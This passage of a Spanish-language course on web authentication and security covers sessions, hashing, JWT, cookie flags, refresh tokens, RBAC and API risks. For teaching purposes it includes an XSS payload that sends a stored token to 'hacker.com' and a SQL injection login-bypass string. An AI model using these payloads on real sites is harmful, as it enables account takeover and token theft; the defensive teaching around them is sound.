Imagina que vas a un caf. Pides un caf y lo pagas. Luego pides una factura. El mozo te mira raro y te pregunta: "Quin eres? Me pagaste?". Tienes que volver a demostrarle todo. Eso es HTTP sin sesiones.

## 2. Qu es una Sesin?
Una sesin es una forma de mantener el estado del usuario a travs de mltiples peticiones. 

**Cmo funciona (El ticket de guardarropa):**
1.  **Login:** Envas tu usuario y clave al servidor.
2.  **Creacin:** El servidor verifica que eres t y crea una "Sesin" en su memoria (o base de datos). A esa sesin le asigna un ID nico y secreto (ej: \`sess_12345abc\`).
3.  **El Ticket:** El servidor te responde envindote ese ID.
4.  **Memoria:** En cada siguiente peticin, tu navegador enva automticamente ese ID. El servidor lo mira, busca en su memoria y dice: "Ah, es la sesin \`sess_12345abc\`, que pertenece a Juan. Bienvenido de nuevo, Juan".

## 3. Almacenamiento de sesiones en el servidor
Dnde guarda el servidor esta informacin?
*   **Memoria RAM:** Rpido, pero si el servidor se reinicia, todos los usuarios se desloguean. Adems, no funciona bien si tienes varios servidores (balanceo de carga).
*   **Base de Datos (SQL):** Persistente, pero puede ser lento si tienes miles de usuarios pidiendo cosas al mismo tiempo.
*   **Redis (Memoria en cach):** El estndar de la industria. Es ultra rpido y persiste aunque reinicies la app principal.

## 4. El peligro del secuestro de sesin (Session Hijacking)
Si alguien te roba tu \`Session ID\`, esa persona **ES T** para el servidor. No necesita tu contrasea, solo necesita tu ID de sesin. Por eso, estos IDs deben viajar siempre por canales seguros (HTTPS) y estar protegidos.

---

### Ejemplo Real:
Cuando cierras sesin en una pgina, lo que realmente est pasando es que:
1.  El servidor borra el registro de ese ID de su base de datos/memoria.
2.  El navegador borra el ID de su almacenamiento.
A partir de ah, el ID queda invalidado. Si alguien intenta usarlo, el servidor dir: "No reconozco este ticket".

### Ejercicio Mental 2:
Si un sitio web guarda las sesiones solo en la memoria RAM del servidor y el programador decide actualizar el cdigo y reiniciar el servidor a las 3:00 PM:
1.  Qu les pasar a los usuarios que estaban navegando en ese momento?
2.  Cmo podras evitar este problema sin dejar de usar sesiones?
`,completed:!1},{id:"auth-security-03-passwords-y-hashing",title:"Passwords y hashing (El arte de no guardar secretos)",level:"junior",content:`# Leccin 3: Passwords y hashing (El arte de no guardar secretos)

Si hay una regla de oro en seguridad es esta: **NUNCA guardes contraseas en texto plano en tu base de datos.** Ni siquiera "encriptadas". Debes guardarlas usando **Hashing**.

## 1. Por qu el texto plano es el final de tu carrera?
Si guardas \`password: "messi123"\` y un hacker entra a tu base de datos, tiene las llaves de todos tus usuarios. Pero hay algo peor: la gente suele usar la misma clave para todo. Si el hacker tiene su clave de tu app de perritos, probablemente tenga su clave de Gmail y de su banco. Seras responsable de una catstrofe.

## 2. Hashing vs Encriptacin
*   **Encriptacin (Simtrica/Asimtrica):** Es de dos vas. Bloqueas un mensaje con una llave y puedes desbloquearlo para leer el original.
*   **Hashing:** Es de **UNA SOLA VA**. Pasas un texto por una funcin matemtica y sale una cadena de caracteres (el "hash"). Es imposible (en teora) volver del hash al texto original.

**Analoga del Licuado:**
El hashing es como meter una banana, una manzana y leche en una licuadora. Obtienes un licuado. Mirando el licuado puedes saber qu tiene, pero no puedes "des-licuarlo" para recuperar la banana entera.

## 3. Cmo verificamos el login entonces?
Si no podemos ver la clave original... cmo sabemos si es correcta?
1.  El usuario se registra con \`messi123\`.
2.  Tu servidor lo pasa por la funcin de hash: \`hash("messi123")\` -> \`a7b2...\`.
3.  Guardas \`a7b2...\` en la base de datos.
4.  Cuando el usuario hace login, escribe \`messi123\`.
5.  Tu servidor hace: \`hash("messi123")\`. Si el resultado es \`a7b2...\`, quiere decir que escribi la clave correcta. **Eureka!**

## 4. Salt (Sal): Evitando las tablas de hackers
Los hackers tienen "Rainbow Tables" (tablas con millones de hashes ya calculados de palabras comunes). Si tu hash es \`a7b2...\`, ellos ya saben que eso significa \`password\`.

Para evitar esto usamos el **Salt**: un pedazo de texto aleatorio que se le suma a la clave antes de licuarla.
\`hash("messi123" + "SAL_ALEATORIA_99")\` -> Ahora el resultado es totalmente diferente e imposible de predecir.

## 5. Algoritmos recomendados
*   **MD5 / SHA1:** PROHIBIDOS! Son viejos y muy fciles de romper.
*   **BCrypt:** El estndar confiable. Es lento a propsito para que a un hacker le cueste aos probar millones de combinaciones.
*   **Argon2:** El ganador de las competiciones de hashing actuales. Es el ms seguro hoy en da.

---

### Error de Junior:
Intentar crear tu propio algoritmo de hashing. No lo hagas. Usa libreras probadas como \`bcryptjs\` o las nativas de tu lenguaje.

### Ejercicio Mental 3:
Si un hacker roba tu base de datos y todas las contraseas estn hasheadas con BCrypt y un buen Salt:
1.  Puede el hacker entrar a las cuentas de los usuarios inmediatamente?
2.  Qu tendra que hacer para intentar descubrir una clave?
3.  Por qu es importante que el proceso de hashing sea "lento"?
`,completed:!1},{id:"auth-security-04-login-y-registro",title:"Login y registro (El flujo completo)",level:"junior",content:`# Leccin 4: Login y registro (El flujo completo)

Ya entendemos la teora. Ahora miremos cmo se ve el proceso real desde que el usuario completa un formulario hasta que entra a tu aplicacin.

## 1. El Proceso de Registro (Sign Up)
1.  **Frontend:** El usuario enva su Email y Contrasea.
2.  **Validacin:** El servidor revisa que el email sea vlido y la contrasea tenga el largo necesario (ej: min 8 caracteres).
3.  **Verificacin de Existencia:** El servidor busca en la base de datos si ya existe un usuario con ese email. Si existe, devuelve un error.
4.  **Hashing:** Se genera un Salt y se hashea la clave.
5.  **Persistencia:** Se guarda el nuevo usuario con la clave hasheada.
6.  **Respuesta:** "Registro exitoso". Podras loguearlo automticamente o pedirle que confirme su email.

## 2. El Proceso de Login (Sign In)
1.  **Frontend:** Enva Email y Contrasea.
2.  **Bsqueda:** El servidor busca al usuario por su email.
3.  **Comparacin:** 
    *   Si no existe el usuario -> Error.
    *   Si existe, comparamos la clave enviada con el hash guardado (usando la funcin \`compare\` de la librera de hashing).
4.  **Creacin de Estado:** Si coinciden, generamos una **Sesin** o un **Token** (veremos tokens ms adelante).
5.  **Respuesta:** Enviamos el ID de sesin o token al cliente.

## 3. Seguridad en los Mensajes de Error (Importante!)
Este es un error clsico. 
*   **MAL:** "El usuario no existe" o "Contrasea incorrecta".
*   **BIEN:** "Email o contrasea invlidos".

**Por qu?** Si dices "El usuario no existe", le ests confirmando a un atacante que ese email no est en tu base de datos. Si dices "Contrasea incorrecta", le confirmas que el email S existe y ahora solo tiene que probar contraseas para esa cuenta. No le des pistas al enemigo.

## 4. Limitacin de Intentos (Rate Limiting)
Un hacker no va a probar 10 claves a mano. Va a usar un programa que pruebe 1,000 claves por segundo. 
Debes bloquear la IP o la cuenta si hay ms de 5 o 10 intentos fallidos en poco tiempo. Esto detiene los ataques de "fuerza bruta".

---

### Ejercicio Prctico 4:
Dibuja (en papel o mentalmente) un diagrama de flujo de qu pasa en el servidor cuando un usuario intenta loguearse. Incluye los caminos de "xito" y los diferentes "Errores".

*Reflexiona: Qu pasara si el servidor tarda mucho en comparar los hashes de las claves? Podra usarse esto para un ataque de denegacin de servicio (DoS)?*
`,completed:!1},{id:"auth-security-05-tokens",title:"Tokens (Autenticacin Moderna)",level:"junior",content:`# Leccin 5: Tokens (Autenticacin Moderna)

Las sesiones (basadas en Cookies) son geniales para sitios web tradicionales, pero tienen problemas cuando nuestra app empieza a crecer o queremos conectar apps mviles. Aqu es donde entran los **Tokens**.

## 1. Qu es un Token?
Imagina que vas a una feria. En la entrada pagas 10 dlares y te dan una pulsera de color con un sello. A partir de ah, para subirte a cualquier juego, ya no sacas tu billetera ni demuestras quin eres; solo muestras la pulsera. 
Esa pulsera es un **Token**.

En programacin, un token es una cadena de texto larga y aparentemente aleatoria que representa tu permiso para usar la aplicacin.

## 2. Stateless (Sin Estado) vs Stateful (Con Estado)
*   **Sesiones (Stateful):** El servidor tiene que recordar cada ID de sesin. Si tienes 1 milln de usuarios, necesitas una base de datos gigante solo para recordar quin est logueado.
*   **Tokens (Stateless):** El servidor **no guarda nada**. El token contiene toda la informacin necesaria (como tu ID de usuario y perfil). El servidor solo lo mira y verifica que el sello de seguridad (la firma) sea autntico.

## 3. Ventajas de los Tokens
1.  **Escalabilidad:** Como el servidor no guarda sesiones, puedes tener 100 servidores trabajando juntos y cualquiera de ellos sabr quin es el usuario con solo mirar el token.
2.  **Mobile Friendly:** Las apps de celular (iOS/Android) no manejan cookies tan fcilmente como los navegadores. Los tokens son su idioma natural.
3.  **Cross-Domain:** Puedes usar el mismo token para pedir datos a diferentes servicios (microservicios).

## 4. El peligro de los Tokens
A diferencia de las sesiones en el servidor, un token es difcil de "invalidar". Si el servidor no guarda una lista de quin est logueado, cmo le quitas el token a alguien antes de que expire? 
Es como si la pulsera de la feria no se pudiera romper. Quien la tenga, entra. Por eso los tokens suelen tener un tiempo de vida corto (expiracin).

---

### Ejemplo de un Token:
\`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ...\`
Parece basura, pero es informacin estructurada. Veremos exactamente qu es esto en la siguiente leccin.

### Ejercicio Mental 5:
Si ests haciendo una aplicacin que solo va a funcionar en un navegador web y no tienes planes de crecer mucho...
1.  Usaras Sesiones o Tokens?
2.  Por qu los tokens son los favoritos de las aplicaciones que usan Microservicios?
`,completed:!1},{id:"auth-security-06-jwt-conceptos",title:"JWT (JSON Web Tokens)",level:"junior",content:`# Leccin 6: JWT (JSON Web Tokens)

Si has escuchado hablar de autenticacin moderna, seguro escuchaste **JWT**. Es el estndar ms usado para tokens hoy en da. Vamos a desarmarlo para ver cmo funciona por dentro.

## 1. La Anatoma de un JWT
Un JWT se divide en tres partes separadas por puntos (\`.\`):
\`HEADER.PAYLOAD.SIGNATURE\`

### A. Header (Cabecera)
Contiene informacin sobre cmo se gener el token. Normalmente dice que es un JWT y qu algoritmo de firma se us (ej: HS256).

### B. Payload (Cuerpo)
Aqu estn los datos reales, llamados "Claims". Es un objeto JSON convertido a Base64.
Ejemplo:
\`\`\`json
{
  "userId": "123",
  "username": "octavio",
  "role": "admin",
  "exp": 1718923000
}
\`\`\`
**Importante:** Cualquier persona que tenga el token puede decodificarlo y leer esto. **NUNCA pongas contraseas u otros datos sensibles en el Payload.**

### C. Signature (Firma)
Es la parte ms importante. Se crea tomando el Header, el Payload y una **LLAVE SECRETA** que solo conoce tu servidor. 
Si alguien cambia aunque sea una letra del Payload (ej: cambia \`role: "user"\` por \`role: "admin"\`), la firma ya no coincidir y el servidor rechazar el token.

## 2. Decodificar vs Verificar
*   **Decodificar:** Es pasar de Base64 a texto legible. Cualquiera puede hacerlo (existen webs como \`jwt.io\`). Por eso no es un lugar secreto.
*   **Verificar:** Es asegurar que el contenido no fue alterado. Solo el servidor, que tiene la llave secreta, puede verificar que la firma es autntica.

## 3. Por qu es genial el JWT?
Porque permite que el servidor sea "ciego". No necesita buscar en la base de datos para saber quin eres. Mira el token, verifica la firma, y si est OK, confa plenamente en la informacin que est adentro.

## 4. Expiracin (\`exp\`)
Como no podemos borrar un JWT fcilmente del mundo una vez emitido, le ponemos una fecha de vencimiento. Cuando el servidor recibe un token, lo primero que hace (adems de ver la firma) es revisar si todava es vlido o si ya expir.

---

### Error de Seguridad Grave:
Usar una llave secreta dbil (ej: \`123456\`) para firmar tus JWT. Un hacker podra adivinarla y empezar a crear tokens falsos para tu aplicacin, dndose permisos de administrador a s mismo.

### Ejercicio Mental 6:
Copia el token de ejemplo de la leccin anterior y pgalo en [jwt.io](https://jwt.io).
1.  Qu informacin puedes ver en el Payload?
2.  Qu pasa si intentas cambiar el nombre del usuario en el editor de la izquierda de esa pgina? Sigue siendo vlida la firma?
`,completed:!1},{id:"auth-security-07-cookies-vs-localstorage",title:"Cookies vs LocalStorage (Dnde guardo el secreto?)",level:"junior",content:`# Leccin 7: Cookies vs LocalStorage (Dnde guardo el secreto?)

Una vez que el servidor te enva un token o un ID de sesin, el navegador tiene que guardarlo en algn lado para enviarlo en la siguiente peticin. Las dos opciones principales son **LocalStorage** y **Cookies**. 
Ninguna es perfecta; ambas tienen sus ataques enemigos.

## 1. LocalStorage
Es un almacn de datos fcil de usar para los programadores de Frontend con JavaScript (\`localStorage.setItem(...)\`).

*   **Pros:** Es muy sencillo de manejar. No tiene lmites de tamao pequeos.
*   **Contras (Ataque XSS):** Si un atacante logra inyectar UN script malicioso en tu web (por ejemplo, a travs de un comentario de un usuario), ese script puede leer TODO tu LocalStorage y enviarle tu token al hacker. JavaScript tiene acceso total.

## 2. Cookies
Son una tecnologa ms antigua pero diseada especficamente para la comunicacin servidor-cliente.

*   **Pros (HttpOnly):** Puedes configurar una cookie como \`HttpOnly\`. Esto significa que el navegador la enviar automticamente al servidor, pero **JavaScript NO puede leerla**. Esto te protege del ataque anterior (XSS).
*   **Contras (Ataque CSRF):** Como las cookies se envan automticamente, un atacante podra engaarte para que hagas clic en un link que haga una peticin a tu web bancaria (\`banco.com/enviar-dinero\`). Tu navegador enviar la cookie pensando que eres t quien hace la peticin.

## 3. Cul elegir?
La recomendacin de seguridad moderna para la mayora de las apps web es:
**USA COOKIES con los flags de seguridad activados:**
1.  **HttpOnly:** Nadie puede leerla con cdigo.
2.  **Secure:** Solo se enva por HTTPS (encriptado).
3.  **SameSite=Strict/Lax:** El navegador solo la enva si la peticin nace desde tu propio sitio, bloqueando el ataque CSRF.

## 4. Cundo usar LocalStorage entonces?
Para guardar cosas que no sean secretas: el tema de la web (claro/oscuro), el lenguaje preferido (espaol/ingls) o elementos del carrito de compras que no comprometan la seguridad.

---

### Ejemplo de configuracin de Cookie segura (en un Servidor):
\`\`\`javascript
res.cookie('token', tokenJWT, {
  httpOnly: true,
  secure: true, // Requiere HTTPS
  sameSite: 'Strict',
  maxAge: 3600000 // 1 hora
});
\`\`\`

### Ejercicio Mental 7:
Imagina que guardas el token de un usuario en \`LocalStorage\`. El usuario entra a un foro de tu web y ve un mensaje que dice: \`<script>fetch('https://hacker.com?token=' + localStorage.getItem('token'))<\/script>\`.
1.  Qu acaba de pasar con la seguridad de ese usuario?
2.  Cmo habra evitado esto el uso de una cookie \`HttpOnly\`?
`,completed:!1},{id:"auth-security-08-seguridad-basica",title:"Seguridad bsica (Tus defensas principales)",level:"junior",content:`# Leccin 8: Seguridad bsica (Tus defensas principales)

La autenticacin no es una isla. Por ms que tengas el mejor login del mundo, si tu servidor tiene grietas en otros lados, el hacker igual entrar. Veamos las defensas bsicas.

## 1. HTTPS (TLS/SSL) es Obligatorio
Si usas \`http://\` en lugar de \`https://\`, toda la informacin (incluyendo contraseas y tokens) viaja por internet en texto plano. Cualquiera que est en el mismo WiFi que el usuario puede ver su clave.
**En 2024, no desplegar con HTTPS es una negligencia profesional.**

## 2. SQL Injection (Inyeccin SQL)
Si tu cdigo hace algo como esto:
\`SELECT * FROM users WHERE email = '\` + emailIngresado + \`'\`
Un hacker podra ingresar como email: \`' OR 1=1 --\`
Y tu servidor ejecutara: \`SELECT * FROM users WHERE email = '' OR 1=1 --'\`
Esto hara que el login fuera exitoso sin siquiera saber el email ni la clave!
**Solucin:** Usa siempre "Queries Parametrizadas" o un ORM (como Mongoose o Sequelize) que ya te protegen de esto.

## 3. XSS (Cross-Site Scripting)
Lo vimos en la leccin anterior. Es cuando alguien logra ejecutar JavaScript en tu pgina.
**Solucin:** Escapar siempre los datos que el usuario ingresa antes de mostrarlos en pantalla. No confes en nada que venga de un formulario.

## 4. Rate Limiting y Brute Force
Ya lo mencionamos, pero vale la pena repetirlo. Tienes que limitar la velocidad. Si alguien pide 50 pginas por segundo desde la misma IP, probablemente sea un bot atacante o un scraper. Blquealo.

## 5. El principio de Menor Privilegio
Al programar tu backend para auth, asegrate de que el usuario de la base de datos que usa tu app solo tenga permisos de \`lectura\` y \`escritura\` en las tablas necesarias. No le des permisos de "Superusuario" de toda la base de datos a tu aplicacin web.

---

### Ejemplo de "Sanitizacin" simple:
Si un usuario intenta registrarse con el nombre: \`Juan <script>alert("hack")<\/script>\`, tu servidor debera transformar eso en \`Juan &lt;script&gt;...\` antes de guardarlo o mostrarlo. As el navegador lo mostrar como texto y no ejecutar el script.

### Ejercicio Mental 8:
Si tienes una app con Login perfecto pero no usas HTTPS:
1.  Qu pasa si el usuario se conecta desde el WiFi de un aeropuerto?
2.  Quines podran ver sus datos de acceso?
`,completed:!1},{id:"auth-security-09-buenas-practicas",title:"Buenas prcticas iniciales",level:"junior",content:`# Leccin 9: Buenas prcticas iniciales

Felicidades! Ya tienes una base slida. Para cerrar este nivel Junior de Autenticacin, repasemos las buenas prcticas que te separarn de un programador improvisado.

## 1. No reinventes la rueda (pero entiende cmo rueda)
Es genial que aprendas a hacer un login desde cero para entender los conceptos. Pero en produccin, usa libreras y estndares probados como **Passport.js**, **Auth0**, **NextAuth** o **Firebase Auth**. Estos servicios ya resolvieron miles de agujeros de seguridad que t an no conoces.

## 2. Implementa "Olvid mi contrasea" de forma segura
No enves la clave vieja por mail (recuerda que ni t la sabes porque est hasheada).
Enva un **link con un token temporal de un solo uso** que venza en 15 o 30 minutos. Al hacer clic, el usuario puede elegir una clave nueva.

## 3. Log Out de verdad
Asegrate de que cuando el usuario presiona "Cerrar sesin":
*   Se borre la cookie o el token del navegador.
*   (Si usas sesiones) Se invalide la sesin en el servidor.
*   Se redirija al usuario a la pgina de Home o Login para que no vea datos que quedaron "atrapados" en la memoria del Frontend.

## 4. Auditora bsica
Guarda un registro (logs) de quin entra y cundo. Pero, **CUIDADO!**, nunca pongas la contrasea en los logs de error del servidor. Muchos Juniors cometen el error de hacer: \`console.log(request.body)\` para debugear, y dejan las claves de sus usuarios escritas en archivos de texto planos en el servidor.

## 5. El futuro: MFA / 2FA
Una contrasea ya no es suficiente. Las buenas prcticas hoy sugieren pedir algo ms: un cdigo por app (Google Authenticator) o un email de confirmacin. Empieza a pensar cmo podras integrar esto en el futuro.

## 6. Password Complexity
No obligues a tus usuarios a usar algo imposible como "2 maysculas, 3 caracteres especiales y una runa antigua", porque terminarn anotndolo en un post-it pegado al monitor. Mejor, enfrate en que la clave sea **larga** (ms de 12 caracteres) o usa un medidor de fuerza visual para que el usuario sea consciente.

---

### Misin Final Junior:
Ya tienes las herramientas conceptuales. Tu prximo paso es tomar tu lenguaje de backend favorito (Node, Python, PHP, etc.) e intentar implementar un login que use:
1.  **Hashing** (con Sal) para guardar contraseas.
2.  **JWT o Cookies** para la sesin.
3.  **HTTPS** para el transporte.

La seguridad es un camino de aprendizaje constante, pero hoy has dado el paso ms importante! 
`,completed:!1,isProject:!0},{id:"auth-security-10-ejercicios-auth-junior",title:"Laboratorio de Autenticacin Junior",level:"junior",content:`# Prctica: Laboratorio de Autenticacin Junior

En este laboratorio aplicars los conceptos de seguridad en un entorno controlado. Los ejercicios estn diseados para realizarse en cualquier lenguaje de backend (Node.js, Python, PHP, Go, etc.).

---

## Ejercicio 1: El Guardian de Secretos (Hashing)
**Contexto:** Necesitas crear una funcin que reciba una contrasea en texto plano y devuelva su versin protegida.

**Consigna:**
1. Instala una librera de hashing confiable (ej: \`bcrypt\` o \`argon2\`).
2. Crea una funcin \`protegerClave(password)\` que:
   - Genere un **Salt**.
   - Devuelva el hash resultante.
3. Intenta pasar la misma palabra dos veces y observa si el resultado es idntico o diferente.

**Resultado esperado:** Al llamar a la funcin con "123456", debes obtener una cadena larga que comience con el identificador del algoritmo (ej: \`$2b$...\`) y que cambie en cada ejecucin debido al Salt.

---

## Ejercicio 2: Registro de Usuario Seguro
**Contexto:** Ests programando el endpoint \`/register\`.

**Consigna:**
1. Crea un array vaco llamado \`usuariosDB\` para simular una base de datos.
2. Crea una funcin de registro que:
   - Reciba \`email\` y \`password\`.
   - Valide que el email no est en \`usuariosDB\`.
   - Hashee la contrasea (usando el ejercicio anterior).
   - Guarde un objeto con \`{ email, passwordHash }\` en el array.
3. **Desafo:** Asegrate de que no se guarde el campo \`password\` original por error.

**Resultado esperado:** Al registrar dos usuarios, el array \`usuariosDB\` debe contener dos objetos donde la contrasea sea ilegible.

---

## Ejercicio 3: El Portero (Login Bsico)
**Contexto:** Ahora el usuario quiere entrar. Tienes que comparar lo que l escribe con lo que guardaste.

**Consigna:**
1. Crea una funcin \`login(email, password)\` que:
   - Busque al usuario en \`usuariosDB\`.
   - Si no existe, devuelva "Credenciales invlidas".
   - Si existe, use la funcin \`compare\` de tu librera de hashing para verificar la clave.
2. **Importante:** Usa el mismo mensaje de error tanto si falla el email como si falla la clave.

**Resultado esperado:** 
- Email correcto + Clave correcta -> "Acceso Concedido".
- Email correcto + Clave mal -> "Credenciales invlidas".
- Email que no existe -> "Credenciales invlidas".

---

## Ejercicio 4: Firma de Pasaporte (Generacin de JWT)
**Contexto:** Si el login es exitoso, no queremos que el usuario nos mande su clave otra vez. Vamos a darle un JWT.

**Consigna:**
1. Instala una librera de JWT (ej: \`jsonwebtoken\` en Node).
2. Modifica el login para que, si el acceso es concedido, genere un token que contenga:
   - \`id\` del usuario.
   - \`rol\` (por defecto "user").
   - Expiracin de 1 hora.
3. Usa una "Secret Key" de al menos 32 caracteres.

**Resultado esperado:** El login ya no devuelve un mensaje de texto, sino un String largo dividido en 3 partes por puntos.

---

## Ejercicio 5: Zona Vip (Proteccin de Rutas)
**Contexto:** Tienes una ruta sensible llamada \`/perfil\` que solo debe ver el dueo de la cuenta.

**Consigna:**
1. Crea una funcin (middleware) que:
   - Lea el token que viene en los encabezados de la peticin (\`Authorization: Bearer <token>\`).
   - Verifique si el token es vlido y no ha expirado.
   - Si es vlido, deje pasar la peticin.
   - Si es invlido o no existe, devuelva un error 401 (No autorizado).

**Resultado esperado:** 
- Peticin sin token a \`/perfil\` -> Bloqueada.
- Peticin con token alterado -> Bloqueada.
- Peticin con token real -> Muestra los datos del perfil.

---

Excelente trabajo! Has completado el circuito bsico de seguridad que toda aplicacin moderna requiere. 
`,completed:!1,isProject:!0},{id:"auth-security-11-refresh-tokens",title:"Refresh Tokens y Rotacin",level:"semi-senior",content:'# Leccin 11: Refresh Tokens y Rotacin\n\nEn el nivel Junior aprendiste que los JWT deben tener una expiracin corta para ser seguros. Pero, qu pasa cuando el token de un usuario expira? Le pedimos que haga login de nuevo cada 15 minutos? No. Para eso existen los **Refresh Tokens**.\n\n## 1. El problema del JWT de larga duracin\n*   **Incorrecto:** Crear un Access Token que dure 1 ao. Si ese token es robado, el atacante tiene acceso por un ao y no puedes revocarlo fcilmente.\n*   **Correcto:** Crear un Access Token de 15 minutos y un Refresh Token de 7 das.\n\n## 2. El flujo del Refresh Token\n1.  **Login:** El servidor devuelve dos tokens: `accessToken` (corto) y `refreshToken` (largo).\n2.  **Uso:** El frontend usa el `accessToken` para todas las peticiones.\n3.  **Expiracin:** Cuando el `accessToken` expira (error 401), el frontend no desloguea al usuario. Enva el `refreshToken` a un endpoint especial (ej: `/refresh`).\n4.  **Renovacin:** El servidor valida el `refreshToken` contra la base de datos. Si es vlido, emite un NUEVO `accessToken`.\n\n## 3. Rotacin de Refresh Tokens (RTR)\nEsta es una prctica de nivel Semi-Senior. Cada vez que el usuario usa un `refreshToken` para pedir un nuevo `accessToken`, el servidor tambin le da un NUEVO `refreshToken` e invalida el anterior.\n\n**Por qu?** Si un atacante rob el `refreshToken` y lo usa, y luego el usuario legtimo lo usa, el servidor detectar que se intent usar un token ya invalidado (reutilizacin) y **bloquear todas las sesiones de ese usuario** inmediatamente, asumiendo un robo.\n\n## 4. Dnde guardar el Refresh Token?\n*   **Access Token:** Puede ir en memoria (estado de React/Vue).\n*   **Refresh Token:** DEBE ir en una **Cookie HttpOnly, Secure e inalcanzable por JS**, dirigida solo al endpoint de `/refresh`.\n\n---\n\n### Caso Real de Error:\nUn programador guarda el `refreshToken` en `LocalStorage`. Un script XSS roba el token. Como el token dura 1 mes, el hacker tiene acceso persistente y el usuario nunca se entera, porque el hacker puede seguir refrescando el acceso sin contrasea.\n\n### Ejercicio Prctico 11:\nDisea el esquema de base de datos para los Refresh Tokens. Qu campos necesitaras para poder revocar un token especfico (por ejemplo, si el usuario dice "me robaron el celular")?\nPista: `userId`, `tokenHash`, `expiresAt`, `revoked`.\n',completed:!1},{id:"auth-security-12-roles-y-permisos",title:"Roles y Permisos (RBAC vs ABAC)",level:"semi-senior",content:`# Leccin 12: Roles y Permisos (RBAC vs ABAC)

Saber quin es el usuario no es suficiente. Debemos saber qu puede hacer. En el nivel Semi-Senior implementamos sistemas de control de acceso granulares.

## 1. RBAC (Role-Based Access Control)
Es el sistema ms comn. Asignas **Roles** a usuarios y **Permisos** a roles.

*   **Usuario:** \`Juan\`
*   **Rol:** \`Editor\`
*   **Permisos del Rol Editor:** \`crear_post\`, \`editar_post\`, \`ver_borradores\`.

**Comparacin Incorrecto vs Correcto:**
*   **Incorrecto:** \`if (user.role === 'admin') { ... }\` esparcido por todo el cdigo. Si maana quieres agregar un rol "SuperAdmin", tienes que cambiar 50 archivos.
*   **Correcto:** \`if (user.can('delete_post')) { ... }\`. No importa qu rol tenga Juan, solo importa si ese rol tiene el permiso necesario.

## 2. ABAC (Attribute-Based Access Control)
Para sistemas complejos donde los roles no alcanzan. Se basa en atributos del usuario, el recurso y el entorno.

**Ejemplo:** *"Un profesor puede editar un examen solo si pertenece a su ctedra y es antes de las 18:00hs"*. Aqu el permiso depende del contexto, no solo del rol.

## 3. Jerarqua de Roles
Un administrador debera poder hacer todo lo que hace un editor, ms sus propias tareas. No dupliques permisos; haz que los roles hereden de otros.

## 4. Middleware de Autorizacin
No valides permisos dentro del controlador (lgica de negocio). Hazlo antes, en una capa separada.

\`\`\`javascript
// Ejemplo conceptual en Node
router.delete('/post/:id', 
  isAuthenticated, 
  hasPermission('delete_post'), 
  deletePostController
);
\`\`\`

---

### Caso Real de Error:
Un sistema de e-commerce permita borrar productos a cualquiera que enviara una peticin \`DELETE\` a \`/api/products/123\`. El programador se olvid de poner el middleware de \`isAdmin\` en esa ruta especfica. Resultado: Un bot borr todo el catlogo de la tienda en 5 minutos.

### Ejercicio Prctico 12:
Imagina una aplicacin de Hospital. Define 3 roles y al menos 2 permisos por cada uno. Cmo manejaras el permiso especial de un mdico que solo puede ver las historias clnicas de SUS pacientes (y no de todos)?
`,completed:!1},{id:"auth-security-13-sesiones-avanzadas",title:"Manejo de Sesiones Avanzado y Revocacin",level:"semi-senior",content:`# Leccin 13: Manejo de Sesiones Avanzado y Revocacin

Como Semi-Senior, debes preocuparte por la escalabilidad y el control absoluto sobre quin est conectado. Los JWT son geniales porque son "stateless", pero su mayor debilidad es la revocacin inmediata.

## 1. El dilema del "Baneo"
Si emites un JWT vlido por 2 horas a un usuario y luego lo bloqueas en tu base de datos por mal comportamiento, el usuario **seguir teniendo acceso** hasta que su token expire. El servidor no sabe que el token ya no es bienvenido porque no guarda estado.

## 2. Solucin: La Lista Negra (Blacklist) con Redis
Para mantener la escalabilidad de los tokens pero ganar control, usamos una base de datos en memoria ultra rpida como **Redis**.

1.  Cuando un usuario hace Logout o es bloqueado, guardamos el \`jti\` (ID nico del token) en Redis con el tiempo que le queda de vida.
2.  En cada peticin, el middleware verifica si el token est en la lista negra.
3.  Redis borra automticamente el token de la lista cuando su tiempo expira.

## 3. Sesiones Hbridas (Database-backed JWT)
Otra opcin es guardar el "Estado de la Sesin" en la DB pero enviar el ID va JWT. 
Esto permite:
*   Ver todos los dispositivos conectados de un usuario.
*   "Cerrar sesin en todos los dispositivos".
*   Forzar un cambio de contrasea y desloguear a todos.

## 4. Comparacin: Session Cookies vs JWT
| Caracterstica | Sessions (Redis/DB) | JWT (Stateless) |
| :--- | :--- | :--- |
| **Revocacin** | Instantnea y fcil | Difcil (requiere blacklist) |
| **Escalabilidad** | Media (requiere DB central) | Alta (no requiere DB) |
| **Info Adicional** | Solo el ID | Puede llevar roles, nombre, etc. |

---

### Escenario de Uso Real:
Un usuario reporta que su cuenta fue hackeada. Como Semi-Senior, tu sistema debe ser capaz de invalidar TODOS los tokens activos de ese usuario con un solo clic en el panel de soporte, sin esperar a que expiren.

### Ejercicio Prctico 13:
Si usas un sistema de Blacklist en Redis para invalidar tokens, cul sera el impacto en la latencia de tu API? Sigue siendo ms rpido que consultar una base de datos SQL tradicional en cada peticin? Justifica por qu Redis es la herramienta elegida aqu.
`,completed:!1},{id:"auth-security-14-seguridad-api",title:"Seguridad en APIs (Protegiendo la puerta trasera)",level:"semi-senior",content:`# Leccin 14: Seguridad en APIs (Protegiendo la puerta trasera)

Exponer una API es como dejar una ventana abierta. Un Semi-Senior no solo protege el login, sino que asegura que la API entera sea resiliente a ataques comunes.

## 1. OWASP Top 10 (Vulnerabilidades ms comunes)
Debes conocer estas tres por sobre todas:
1.  **Broken Object Level Authorization (BOLA):** Un usuario pide \`/api/orders/500\`. Logueado como el usuario 2, cambia la URL a \`/api/orders/501\` y puede ver el pedido de otra persona.
    *   **Solucin:** Siempre filtrar por \`ownerId\`: \`SELECT * FROM orders WHERE id = 501 AND user_id = current_user.id\`.
2.  **Excessive Data Exposure:** La API devuelve TODO el objeto del usuario (incluyendo password hash o datos privados) y el frontend solo muestra el nombre.
    *   **Solucin:** Usa DTOs (Data Transfer Objects) o transformadores para enviar solo lo estrictamente necesario.
3.  **Mass Assignment:** El usuario enva en el registro: \`{ "email": "a@b.com", "role": "admin" }\`. Si el servidor guarda todo el objeto sin filtrar, el usuario se hizo administrador solo.

## 2. Rate Limiting Avanzado
No bloquees solo por IP (muchos usuarios pueden compartir una IP pblica, como en una oficina).
*   **Mejor:** Limita por Usuario Logueado (ID).
*   **Diferenciado:** Los usuarios gratuitos tienen 10 peticiones/min, los Premium tienen 100/min.

## 3. Seguridad de los Headers
Agrega capas de seguridad con encabezados HTTP:
